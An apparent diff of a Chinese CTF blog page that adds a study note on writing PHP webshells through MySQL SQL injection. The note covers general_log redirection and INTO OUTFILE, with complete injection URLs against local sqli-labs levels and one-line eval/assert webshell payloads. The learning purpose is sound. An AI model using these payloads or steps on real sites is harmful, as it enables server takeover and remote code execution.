@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
   
-  <meta name="robots" content="noindex,follow">
+  
   <meta name="generator" content="Hexo 8.1.1">
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   
@@ -17,15 +17,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>归档 - Yu9991n9的博客</title>
+  <title>sql写马 - Yu9991n9的博客</title>
 
   
-    <meta property="og:type" content="website">
-<meta property="og:title" content="归档">
-<meta property="og:url" content="https://yu9991n9.github.io/archives/2026/">
+    <meta name="description" content="基础知识MySQL写马主要分为into outfile和日志写马两种 日志写马日志写马需要将全局变量general_log设置成on，MySQL的两个全局变量： -general_log：保存日志状态 -general_log_file:日志保存路径 我这里就是显示的off，要把它设置成on  设置成on：  设置成on之后，日志文件就会记录我们写的SQL语句了，我们的日志文件就是上图中的gene">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql写马">
+<meta property="og:url" content="https://yu9991n9.github.io/2026/08/21/sql%E5%86%99%E9%A9%AC/">
 <meta property="og:site_name" content="Yu9991n9的博客">
+<meta property="og:description" content="基础知识MySQL写马主要分为into outfile和日志写马两种 日志写马日志写马需要将全局变量general_log设置成on，MySQL的两个全局变量： -general_log：保存日志状态 -general_log_file:日志保存路径 我这里就是显示的off，要把它设置成on  设置成on：  设置成on之后，日志文件就会记录我们写的SQL语句了，我们的日志文件就是上图中的gene">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://yu9991n9.github.io/images/avatar.jpg">
+<meta property="article:published_time" content="2026-08-21T09:30:00.000Z">
+<meta property="article:modified_time" content="2026-08-21T09:30:33.743Z">
 <meta property="article:author" content="Yu9991n9">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://yu9991n9.github.io/images/avatar.jpg">
@@ -44,12 +48,12 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://yu9991n9.github.io","author":{"@type":"Person","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg"},"name":"Yu9991n9的博客","description":"","url":"https://yu9991n9.github.io"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg"},"dateCreated":"2026-08-21T17:30:00+08:00","dateModified":"2026-08-21T17:30:33+08:00","datePublished":"2026-08-21T17:30:00+08:00","description":"","headline":"sql写马","mainEntityOfPage":{"@type":"WebPage","@id":"https://yu9991n9.github.io/2026/08/21/sql%E5%86%99%E9%A9%AC/"},"publisher":{"@type":"Organization","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg","logo":{"@type":"ImageObject","url":"/images/avatar.jpg"}},"url":"https://yu9991n9.github.io/2026/08/21/sql%E5%86%99%E9%A9%AC/","image":[]}</script>
   
 </head>
 <body>
 
-<div class="l_body index" id="start" layout="undefined" type="undefined" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
 <header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Yu9991n9的博客</div></a></div></header>
@@ -61,21 +65,149 @@
 <div class="widgets">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
+
+
 <widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2026/08/21/sql%E5%86%99%E9%A9%AC/"><span class="title">sql写马</span></a><a class="item title" href="/2026/08/21/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="title">临时文件包含</span></a><a class="item title" href="/2026/08/21/%E5%88%B7%E9%A2%98%E5%B0%8F%E8%AE%B0/"><span class="title">刷题小记</span></a><a class="item title" href="/2026/08/21/pearcmd/"><span class="title">pearcmd</span></a><a class="item title" href="/2026/08/21/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/"><span class="title">SQL注入进阶</span></a><a class="item title" href="/2026/08/16/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%83%A8%E5%88%86%E9%93%BE%E5%AD%90%EF%BC%88URLDNS,CC1,CC6)/"><span class="title">Java反序列化的部分链子（URLDNS、CC1、CC6）</span></a><a class="item title" href="/2026/03/18/%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E7%9A%84%E8%AE%B0%E5%BD%95/"><span class="title">部分刷题的记录</span></a><a class="item title" href="/2026/07/03/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"><span class="title">无列名注入</span></a><a class="item title" href="/2026/05/13/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"><span class="title">渗透之信息搜集</span></a><a class="item title" href="/2026/06/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span class="title">Java安全漫谈学习笔记</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
 
-<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Yu9991n9的博客</div></a></div></header>
-
- 
 
 
-<div class="navbar top"><div class="navbar-blur"><div class="navbar-container"><nav class="post"><a href="/">近期发布</a><a href="/categories/">分类</a><a class="active" href="/archives/">归档</a></nav></div></div></div><div class="post-list archives"><article class="" id="archive"><div class='archive-header h4'>2026</div><div class="archive-list"><a class='post fs14' href="/2026/08/21/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><time>08-21</time><span>临时文件包含</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/21/sql%E5%86%99%E9%A9%AC/"><time>08-21</time><span>sql写马</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/21/%E5%88%B7%E9%A2%98%E5%B0%8F%E8%AE%B0/"><time>08-21</time><span>刷题小记</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/21/pearcmd/"><time>08-21</time><span>pearcmd</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/21/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/"><time>08-21</time><span>SQL注入进阶</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/16/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%83%A8%E5%88%86%E9%93%BE%E5%AD%90%EF%BC%88URLDNS,CC1,CC6)/"><time>08-16</time><span>Java反序列化的部分链子（URLDNS、CC1、CC6）</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/07/21/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"><time>07-21</time><span>宽字节注入</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/07/03/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"><time>07-03</time><span>无列名注入</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/06/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><time>06-29</time><span>Java安全漫谈学习笔记</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/06/24/java%E5%AE%89%E5%85%A8%E5%89%8D%E7%BD%AE%E5%8F%8D%E5%B0%84/"><time>06-24</time><span>Java安全前置：反射</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/05/13/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"><time>05-13</time><span>渗透之信息搜集</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/03/26/polar%E5%9B%B0%E9%9A%BE/"><time>03-26</time><span>Polar困难</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/03/18/%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E7%9A%84%E8%AE%B0%E5%BD%95/"><time>03-18</time><span>部分刷题的记录</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/03/12/%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87-wakeup/"><time>03-12</time><span>各版本绕过_wakeup()</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/03/08/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><time>03-08</time><span>session 文件包含</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/03/02/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/"><time>03-02</time><span>[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/01/25/polar%E4%B8%AD%E7%AD%89/"><time>01-25</time><span>Polar中等</span></a></div></article></div>
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/ctf/">CTF</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-08-21T09:30:00.000Z">2026-08-21</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-08-21T09:30:33.743Z">2026-08-21</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>sql写马</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>MySQL写马主要分为into outfile和日志写马两种</p>
+<h2 id="日志写马"><a href="#日志写马" class="headerlink" title="日志写马"></a>日志写马</h2><p>日志写马需要将全局变量general_log设置成on，MySQL的两个全局变量：</p>
+<p>-general_log：保存日志状态</p>
+<p>-general_log_file:日志保存路径</p>
+<p>我这里就是显示的off，要把它设置成on</p>
+<p><img src="/images/ctf/sql%E5%86%99%E9%A9%AC/image-20260306164211361-3166389.png" alt="image-20260306164211361"></p>
+<p>设置成on：</p>
+<p><img src="/images/ctf/sql%E5%86%99%E9%A9%AC/image-20260306164304566-3166409.png" alt="image-20260306164304566"></p>
+<p>设置成on之后，日志文件就会记录我们写的SQL语句了，我们的日志文件就是上图中的general_log_file里面的那一栏，不管我们的SQL语句是否正确都会被记录进去，有一个点和dns那里一样，那就是secure_file_prov的值也必须是空才可以，不过general_log_file可以直接通过SQL语句修改，必须要修改为比如php后缀的文件，不然马不能被解析</p>
+<p><img src="/images/ctf/sql%E5%86%99%E9%A9%AC/image-20260306175722737-3166367.png" alt="image-20260306175722737"></p>
+<p>我们这里填入general_log_file的路径必须是绝对路径，我们会使用set命令把MySQL日志重定向到一个php文件，这里必须是php文件，否则我们写入的马不会被解析，这个php文件必须放在网站的根目录或者可访问的子目录，如果路径没写对那就是白费：</p>
+<p>MySQL 的 <code>general_log_file</code> 等配置，要求路径必须是<strong>绝对路径</strong>（从磁盘根目录开始的完整路径，如 <code>/Applications/phpstudy/WWW/log.php</code> 或 <code>D:\phpStudy\WWW\log.php</code>），不能是相对路径。</p>
+<p>只有知道网站的绝对路径，你才能构造出合法的 <code>general_log_file</code> 路径，让 MySQL 把日志写到你指定的 PHP 文件里。</p>
+<p>我们可以使用select @@b asedir;查看MySQL数据库安装的绝对路径：<br>mysql&gt; select @@b asedir;<br>+——————————–+<br>| @@b asedir                      |<br>+——————————–+<br>| D:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;MySQL&#x2F; |<br>+——————————–+<br>1 row in set (0.07 sec)</p>
+<p>我们在实际操作时，先将general_log设置成on：</p>
+<p>set global general_log &#x3D; ‘on’; </p>
+<p>set global general_log_file &#x3D; ‘&#x2F;Applications&#x2F;phpstudy&#x2F;WWW&#x2F;log.php’;</p>
+<p>这个时候是用不了union的，它用不了set</p>
+<p>因为要日志写马能够连接必须要修改general_log_file为比如php后缀的文件，不然马不能被解析。所以必须要先用到set global general_log_file&#x3D;’…php’;，那么union注入就没机会了，union基本都是?id&#x3D;1 union select 1,2,select ‘<?php assert($_POST[v]);?>‘;这样，不能执行set的。</p>
+<p>（2）有堆叠注入，要先?id&#x3D;1;set global general_log_file&#x3D;’…php’;，然后直接执行?id&#x3D;1;select ‘<?php assert($_POST[v]);?>‘;</p>
+<p>不过首先要想有堆叠注入的条件，源码中必须要用到mysqli_multi_query()，那么我们此处就可以执行多个sql语句进行注入。一般后台查询数据库使用的语句都是用mysql_query()，所以堆叠注入在mysql上不常见。mysqli_multi_query()可以执行多个sql语句，而mysqli_query()只能执行一个sql语句。</p>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
+<p>（3）再者就是已经成功登录到别人的数据库里了，要先set global general_log_file&#x3D;’…php’;，然后直接执行select ‘<?php assert($_POST[v]);?>‘;</p>
+<p>6.对方没有对’和”进行过滤,因为outfile后面的物理路径必须要有引号</p>
+<p>下面是一般流程：</p>
+<p>set global general_log_file&#x3D;’…php’;</p>
+<p>select ‘<?php assert($_POST[v]);?>‘;</p>
+<p>或者堆叠注入：</p>
+<p>set global general_log_file&#x3D;’…php’;</p>
+<p>?id&#x3D;1;select ‘<?php assert($_POST[v]);?>‘;<br>或者直接?id&#x3D;<?php assert($_POST[v]);?>;都可以了，因为sql语句不管对错日志都会记录</p>
+<p>当然这里要看环境支不支持堆叠注入了</p>
+<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>sqli-labs第三十八关：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-38/?id=-1">http://127.0.0.1/sqli-labs-master/Less-38/?id=-1</a>‘ union select 1,2,3;set global general_log&#x3D;’on’;–+</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-38/?id=-1">http://127.0.0.1/sqli-labs-master/Less-38/?id=-1</a>‘ union select 1,2,3;set global general_log_file&#x3D;’D:\phpStudy\PHPTutorial\WWW\log.php’;–+(typora里面两个当成特殊符号了)</p>
+<p><img src="/images/ctf/sql%E5%86%99%E9%A9%AC/image-20260306192824605-3166434.png" alt="image-20260306192824605"></p>
+<p>这里\要换成两个，涉及到转义</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-38/?id=1%27;select">http://127.0.0.1/sqli-labs-master/Less-38/?id=1&#39;;select</a> ‘<?php assert($_POST[v]);?>‘;–+</p>
+<p>或者直接?id&#x3D;<?php assert($_POST[v]);?>;都可以了，因为sql语句不管对错日志都会记录</p>
+<p><img src="/images/ctf/sql%E5%86%99%E9%A9%AC/image-20260306192948927-3166453.png" alt="image-20260306192948927"></p>
+<p>&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin&#x2F;mysql -u root -p    进入MySQL</p>
+<p>参考文献：</p>
+<p><a target="_blank" rel="noopener" href="https://ccc-f.github.io/posts/3e95d273#%E6%9D%A1%E4%BB%B6">https://ccc-f.github.io/posts/3e95d273#%E6%9D%A1%E4%BB%B6</a></p>
+<h1 id="mysql-into-outfile注射一句话木马"><a href="#mysql-into-outfile注射一句话木马" class="headerlink" title="mysql into outfile注射一句话木马"></a>mysql into outfile注射一句话木马</h1><p>这个同样也需要secure_file_priv是空，同样也需要绝对路径</p>
+<p><strong>MySQL 可以把查询结果写入服务器文件。</strong></p>
+<p>SQL语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 内容 INTO OUTFILE &#x27;服务器路径/文件名&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>数据库会：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把 SELECT 查询结果 → 写入服务器磁盘文件</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;hello&#x27; INTO OUTFILE &#x27;/tmp/test.txt&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>服务器就会生成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/test.txt</span><br></pre></td></tr></table></figure>
+
+<p>内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>一般来说就是：unsion select ‘语句’ into outfile “绝对路径”</p>
+<p>unsion select ‘语句’ into outfile “绝对路径”，这个绝对路径有的时候可以根据题目的报错得知</p>
+<p><a target="_blank" rel="noopener" href="http://www.test.com/xxxx.php/1.txt?id=1">http://www.test.com/xxxx.php/1.txt?id=1</a> UNION SELECT 1,’<?php eval(phpinfo());?>‘ into outfile “C:&#x2F;phpStudy&#x2F;WWW&#x2F;666.php”</p>
+<p>在直接登录进数据库时：</p>
+<p>SELECT “<?php @e val($_POST['xiaohua']); ?>“<br>INTO OUTFILE ‘&#x2F;tmp&#x2F;test1.php’</p>
+<p>在url里要用union：</p>
+<p>例子：<br>?id&#x3D;1 union select ‘<?php @e val($_POST['c']);?>‘ into outfile “C:&#x2F;phpStudy&#x2F;WWW&#x2F;a.php”</p>
+<p>?id&#x3D;1’)) UNION SELECT 1,2,’<?php @e val($_POST["v"]);?>‘ into outfile “D:\phpStudy\PHPTutorial\WWW\hack.php” –+</p>
+<p>或者堆叠：</p>
+<p>?id&#x3D;1’);SELECT ‘<?php @e val($_POST["v"]);?>‘ into outfile “D:\phpStudy\PHPTutorial\WWW\hack.php”;–+</p>
+<p>1.判断注入类型</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-7/?id=1">http://127.0.0.1/sqli-labs-master/Less-7/?id=1</a>‘ 报错<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-7/?id=1">http://127.0.0.1/sqli-labs-master/Less-7/?id=1</a>‘)) –+ 正常</p>
+<p>2.判断列数</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-7/?id=1">http://127.0.0.1/sqli-labs-master/Less-7/?id=1</a>‘)) order by 3 –+ 正常</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-7/?id=1">http://127.0.0.1/sqli-labs-master/Less-7/?id=1</a>‘)) order by 4 –+ 报错</p>
+<p>说明存在3列</p>
+<p>3.文件写入</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-7?id=1">http://127.0.0.1/sqli-labs-master/Less-7?id=1</a>‘)) UNION SELECT 1,2,’<?php @e val($_POST["v"]);?>‘ into outfile “D:\phpStudy\PHPTutorial\WWW\hack.php” –+（一样还是两个）<br>或者”D:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;hack.php”，就是不能\，经过测试这样导入不成功。</p>
+<p><img src="/images/ctf/sql%E5%86%99%E9%A9%AC/image-20260306195449836-3167582.png" alt="image-20260306195449836"></p>
+<p>上面的图中报了错：You have an error in your SQL syntax,显示sql出错了，但是没有关系，我们可以在文件中看到hack.php已经生成了。</p>
+<p>这时候用菜刀等webshell管理工具连接就可以了，我下面用的是蚁剑，可以看到连接成功。</p>
+<p><img src="/images/ctf/sql%E5%86%99%E9%A9%AC/image-20260306195459673-3167606.png" alt="image-20260306195459673"></p>
+<p>堆叠注入：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-40/?id=1%27);SELECT">http://127.0.0.1/sqli-labs-master/Less-40/?id=1&#39;);SELECT</a> ‘<?php @e val($_POST["v"]);?>‘ into outfile “D:\phpStudy\PHPTutorial\WWW\hack.php”;–+</p>
+<p>然后该目录下便生成了我们的马儿，用shell管理工具便可成功连接。从这里可以看到一定要知道网站的绝对路径。</p>
+<p>直接成功登录数据库的into outfile写入一句话木马可以说是方法和前面两个的差不多，就是可以用show来看全局变量的值。这里就不赘述了。</p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2026/08/21/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">临时文件包含</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2026/08/21/%E5%88%B7%E9%A2%98%E5%B0%8F%E8%AE%B0/">刷题小记</a></div></section></div>
+
+
+
+
+
+
 <footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Yu9991n9</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
 </div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
-</aside><div class='float-panel'>
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%86%99%E9%A9%AC"><span class="toc-text">日志写马</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-text">例子</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql-into-outfile%E6%B3%A8%E5%B0%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">mysql into outfile注射一句话木马</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
   </button>
